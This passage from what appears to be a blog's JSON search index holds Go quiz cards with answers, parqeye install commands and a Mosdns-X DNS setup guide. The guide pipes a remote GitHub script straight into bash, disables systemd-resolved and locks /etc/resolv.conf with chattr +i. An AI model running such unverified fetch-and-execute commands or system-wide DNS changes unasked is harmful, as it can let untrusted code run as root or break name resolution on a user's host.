compliation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/SXwEiV0FUWJ\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Th1vvvhoDjR\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompliation error\n-128 / a (constant 128 of type int8) overflows int8\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable4\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint8\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Z8N_FB4szWY\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e-128\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable5\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt2\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e =\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei1\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt1\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei2\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMyInt2\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ei1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ei2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Q25PLVaAOfd\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot use i (variable of type int) as MyInt1 value in variable declaration\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003evariable6\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eX\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e7.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} = \u003cspan style=\"color:#a6e22e\"\u003eX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e.(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(int(\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 7\u003c/li\u003e\n\u003cli\u003eB. 7.0\u003c/li\u003e\n\u003cli\u003eC. 0\u003c/li\u003e\n\u003cli\u003eD. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/lKmlfL6X6Qu\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Variable"},{"categories":["URL","Rust","Parquet"],"contents":" parqeye install methods cargo install parqeye brew install kaushiksrini/parqeye/parqeye ","date":"November 18, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251118-parqeye/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/kaushiksrini/parqeye\" target=\"_blank\" rel=\"noopener\"\u003eparqeye\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install-methods\"\u003einstall methods\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ecargo install parqeye\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ebrew install kaushiksrini/parqeye/parqeye\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Rust","Parquet"],"title":"parqeye"},{"categories":["URL","Go","DNS","linux"],"contents":" Mosdns-X 让 Linux 系统的 DNS 更快更干净：部署 Mosdns-X install bash \u0026lt;(curl -sL https://raw.githubusercontent.com/lidebyte/bashshell/refs/heads/main/mosdns-x-manager.sh) config sudo tee /etc/mosdns-x/config.yaml \u0026gt; /dev/null \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; # mosdns-x 并发查询（无分流）配置 log: level: info file: /var/log/mosdns-x/mosdns-x.log plugins: # 缓存插件 - tag: cache type: cache args: size: 1024 lazy_cache_ttl: 1800 # 并发上游：取最先返回的可用答案 - tag: forward_all type: fast_forward args: upstream: # 阿里 - addr: \u0026#34;udp://223.5.5.5\u0026#34; - addr: \u0026#34;tls://dns.alidns.com\u0026#34; # DNSPod / doh.pub - addr: \u0026#34;udp://119.29.29.29\u0026#34; - addr: \u0026#34;tls://dot.pub\u0026#34; # Cloudflare - addr: \u0026#34;udp://1.1.1.1\u0026#34; - addr: \u0026#34;tls://cloudflare-dns.com\u0026#34; # Google - addr: \u0026#34;udp://8.8.8.8\u0026#34; - addr: \u0026#34;tls://dns.google\u0026#34; # 主流水线：小缓存 → 并发优选 - tag: main type: sequence args: exec: - cache - forward_all # 监听（双栈 UDP/TCP 53） servers: - exec: main listeners: - addr: :53 protocol: udp - addr: :53 protocol: tcp EOF systemd sudo tee /etc/systemd/system/mosdns.service \u0026gt; /dev/null \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; [Unit] Description=Mosdns-X DNS Accelerator After=network.target [Service] Type=simple User=root Group=root ExecStart=/usr/local/bin/mosdns-x start --as-service -d /usr/local/bin -c /etc/mosdns-x/config.yaml Restart=always RestartSec=5 StandardOutput=journal StandardError=journal SyslogIdentifier=mosdns [Install] WantedBy=multi-user.target EOF sudo systemctl daemon-reload sudo systemctl enable --now mosdns # 备份系统 DNS sudo cp -n /etc/resolv.conf /etc/resolv.conf.mosdns-backup # 改为使用本地 Mosdns-X echo -e \u0026#34;nameserver 127.0.0.1\\noptions edns0\u0026#34; | sudo tee /etc/resolv.conf # 若 53 端口被 systemd-resolved 占用，可禁用它 sudo systemctl disable --now systemd-resolved 2\u0026gt;/dev/null || true # 如果想顺便加锁（防止被 DHCP 修改），加上 chattr 一起执行： echo -e \u0026#34;nameserver 127.0.0.1\\n\u0026#34; \u0026gt; /etc/resolv.conf \u0026amp;\u0026amp; chattr +i /etc/resolv.conf # 查看进程状态 sudo systemctl status mosdns --no-pager # 测试解析速度（第二次命中缓存更快） dig +stats www.google.com dig +stats www.baidu.com # 查看实时日志 tail -f /var/log/mosdns-x/mosdns-x.log ","date":"November 9, 2025","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251109-mosdns-x/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/pmkol/mosdns-x\" target=\"_blank\" rel=\"noopener\"\u003eMosdns-X\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/OxpX7FQ1\" target=\"_blank\" rel=\"noopener\"\u003e让 Linux 系统的 DNS 更快更干净：部署 Mosdns-X\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install\"\u003einstall\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebash \u0026lt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecurl -sL https://raw.githubusercontent.com/lidebyte/bashshell/refs/heads/main/mosdns-x-manager.sh\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"config\"\u003econfig\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tee /etc/mosdns-x/config.yaml \u0026gt; /dev/null \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;\u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# mosdns-x 并发查询（无分流）配置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003elog:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  level: info\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  file: /var/log/mosdns-x/mosdns-x.log\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eplugins:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 缓存插件\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      size: 1024\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      lazy_cache_ttl: 1800\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 并发上游：取最先返回的可用答案\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: forward_all\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: fast_forward\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      upstream:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # 阿里\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://223.5.5.5\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dns.alidns.com\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # DNSPod / doh.pub\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://119.29.29.29\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dot.pub\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # Cloudflare\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://1.1.1.1\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://cloudflare-dns.com\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        # Google\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;udp://8.8.8.8\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - addr: \u0026#34;tls://dns.google\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  # 主流水线：小缓存 → 并发优选\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - tag: main\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    type: sequence\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    args:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      exec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        - forward_all\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e# 监听（双栈 UDP/TCP 53）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 